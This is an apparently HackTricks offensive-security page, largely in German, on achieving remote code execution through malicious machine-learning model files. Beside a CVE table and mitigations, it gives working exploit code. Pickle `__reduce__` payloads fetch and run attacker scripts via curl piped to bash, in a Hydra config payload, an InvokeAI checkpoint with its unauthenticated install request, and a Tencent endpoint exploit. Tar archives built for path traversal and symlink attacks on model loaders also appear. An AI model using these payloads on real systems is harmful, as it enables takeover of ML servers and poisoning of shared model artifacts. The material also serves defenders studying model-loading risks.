# RCE in Modellen

{{#include ../banners/hacktricks-training.md}}

## Modelle laden bis zur RCE

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten geteilt, z. B. ONNX, TensorFlow, PyTorch, etc. Diese Modelle können in Entwickler‑Maschinen oder Produktionssysteme geladen werden, um sie zu nutzen. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber es gibt Fälle, in denen ein Modell verwendet werden kann, um willkürlichen Code auf dem System auszuführen — entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Modell‑Loading‑Bibliothek.

Zum Zeitpunkt der Erstellung sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges pickle im Modell‑Checkpoint führt zur Codeausführung (umgeht `weights_only`‑Schutz)                                           | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + böswilliger Modelldownload verursacht Codeausführung; Java‑Deserialisierungs‑RCE in der Management‑API                            | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint‑Deserialisierung via `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst einen pickle‑Reducer während `load_model_trainer_states_from_checkpoint` aus → Codeausführung im ML‑Worker | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Laden eines Modells mit **Lambda**‑Layer führt beliebigen Python‑Code aus | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Manipuliertes `.tflite`‑Modell löst Integer‑Overflow aus → Heap‑Korruption (potentiell RCE)                                              | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells via `joblib.load` führt ein pickle mit dem `__reduce__`‑Payload des Angreifers aus                                  | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *strittig*                                                                              | `numpy.load` erlaubt standardmäßig gepicklete Objektarrays – bösartige `.npy/.npz` löst Codeausführung aus                              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Externer Weights‑Pfad eines ONNX‑Modells kann das Verzeichnis verlassen (liest beliebige Dateien) <br> Bösartiges ONNX‑Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modell mit custom operator erfordert das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Nutzung der model‑load API mit `--model-control` aktiviert erlaubt relative Pfad‑Traversal, um Dateien zu schreiben (z. B. `.bashrc` überschreiben für RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (mehrere Heap‑Overflows)                                                                         | Fehlerhafte GGUF‑Modell‑Datei verursacht Heap‑Buffer‑Overflows im Parser und ermöglicht die Ausführung beliebigen Codes auf dem Zielsystem | |
| **Keras (ältere Formate)**  | *(No new CVE)* Legacy Keras H5 model                                                                                         | Bösartige HDF5 (`.h5`)‑Modelle mit Lambda‑Layer‑Code werden beim Laden weiterhin ausgeführt (Keras safe_mode deckt altes Format nicht ab – „downgrade attack“) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Viele ML‑Tools (z. B. pickle‑basierte Modellformate, Python `pickle.load`) führen eingebetteten Code in Modell‑Dateien aus, sofern nicht mitigiert | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Angreifer‑kontrollierte Modell‑Metadaten/Config setzen `_target_` auf beliebig aufrufbares Objekt (z. B. `builtins.exec`) → wird während des Ladens ausgeführt, sogar mit „sicheren“ Formaten (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Außerdem gibt es einige python‑pickle‑basierte Modelle, wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die willkürlichen Code auf dem System ausführen können, wenn sie nicht mit `weights_only=True` geladen werden. Daher sind grundsätzlich alle pickle‑basierten Modelle besonders anfällig für diese Angriffsart, auch wenn sie nicht in der obigen Tabelle aufgeführt sind.

### Hydra‑Metadaten → RCE (funktioniert sogar mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jede punktierte `_target_` in einem Konfigurations-/Metadaten‑Objekt auf. Wenn Bibliotheken **nicht vertrauenswürdige Modell‑Metadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente liefern, die sofort beim Modell‑Laden ausgeführt werden (kein pickle erforderlich).

Payload‑Beispiel (funktioniert in `.nemo` `model_config.yaml`, repo `config.json`, oder `__metadata__` innerhalb von `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Wichtige Punkte:
- Getriggert vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.
- Hydras string block-list ist umgehbar über alternative Importpfade (z. B. `enum.bltns.eval`) oder application-resolved names (z. B. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok parst außerdem stringifizierte Metadaten mit `ast.literal_eval`, was DoS (CPU/Memory-Blowup) vor dem Hydra-Aufruf ermöglicht.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, mit dem Benutzer Modelle von beliebigen URLs herunterladen und laden können.

Intern ruft der Endpunkt schließlich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von einer vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in das checkpoint einbetten; die Methode wird **during deserialization** ausgeführt und führt zu **remote code execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle wurde mit **CVE-2024-12029** bezeichnet (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Erstelle ein bösartiges checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hosten Sie `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den verwundbaren endpoint aus (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

•  InvokeAI 5.3.1–5.4.2 (scan-Flag standardmäßig **false**)  
•  `/api/v2/models/install` für den Angreifer erreichbar  
•  Der Prozess hat Berechtigungen, Shell-Befehle auszuführen

#### Gegenmaßnahmen

* Auf **InvokeAI ≥ 5.4.3** aktualisieren – das Update setzt `scan=True` standardmäßig und führt Malware-Scans vor der Deserialisierung durch.  
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` verwenden oder den neuen Helfer [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) nutzen.  
* Allow-Lists / Signaturen für Modellquellen durchsetzen und den Dienst mit geringstmöglichen Rechten (least-privilege) betreiben.

> ⚠️ Denken Sie daran, dass **jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) inhärent unsicher ist, aus nicht vertrauenswürdigen Quellen zu deserialisieren.

---

Beispiel für eine ad-hoc Gegenmaßnahme, falls Sie ältere InvokeAI-Versionen hinter einem Reverse-Proxy weiter betreiben müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE durch unsichere `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) stellte einen unsicheren checkpoint loader bereit, der direkt `torch.load()` auf vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter checkpoint während der Deserialisierung über einen reducer beliebigen Code ausführen.

Verwundbarer Pfad (vor Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum das zu RCE führt: Bei Python `pickle` kann ein Objekt einen reducer (`__reduce__`/`__setstate__`) definieren, der einen Callable und Argumente zurückgibt. Der Callable wird während des Unpicklings ausgeführt. Wenn ein solches Objekt in einem checkpoint vorhanden ist, läuft es, bevor irgendwelche Gewichte verwendet werden.

Minimales bösartiges checkpoint-Beispiel:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanisierte checkpoints/models, die über repos, buckets oder artifact registries geteilt werden
- Automatisierte resume/deploy Pipelines, die checkpoints automatisch laden
- Die Ausführung findet innerhalb von training/inference workers statt, oft mit erhöhten Rechten (z. B. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschränkten, allow-listed Deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass beliebige Callables während des Ladens aufgerufen werden.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Erzwinge Modellprovenienz/-signaturen und sandboxed Deserialisierung (seccomp/AppArmor; non-root user; eingeschränktes FS und keine ausgehende Netzwerkverbindung).
- Überwache unerwartete Child-Prozesse von ML-Services zur Checkpoint-Ladezeit; verfolge `torch.load()`/`pickle`-Nutzung.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialisierung Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet` endpoint bereit, der nutzergesteuerte Daten deserialisiert. ZDI bestätigte, dass ein entfernter Angreifer ein Opfer dazu zwingen kann, eine bösartige Seite/Datei zu laden, diese dazu zu bringen, ein crafted serialized blob an diesen endpoint zu senden, und so die Deserialisierung als `root` auszulösen, was zur vollständigen Kompromittierung führt.

Der Exploit-Ablauf spiegelt typischen pickle abuse wider:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Jedes gadget, das während der deserialization erreichbar ist (constructors, `__setstate__`, framework callbacks, etc.), kann auf die gleiche Weise weaponized werden, unabhängig davon, ob der Transport über HTTP, WebSocket, oder eine Datei erfolgte, die in ein überwachtes Verzeichnis gelegt wurde.

## Modelle für Path Traversal

Wie in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die meisten Modellformate, die von verschiedenen AI frameworks verwendet werden, auf Archiven, üblicherweise `.zip`. Daher kann es möglich sein, diese Formate zu missbrauchen, um path traversal attacks durchzuführen und so beliebige Dateien von dem System zu lesen, auf dem das Modell geladen wird.

Zum Beispiel können Sie mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` anlegt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder mit dem folgenden Code können Sie ein model erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras Deserialisierung und gadget hunting

Für eine fokussierte Anleitung zu den .keras-Interna, Lambda-layer RCE, dem arbitrary import issue in ≤ 3.8 und zur post-fix gadget discovery innerhalb der allowlist, siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
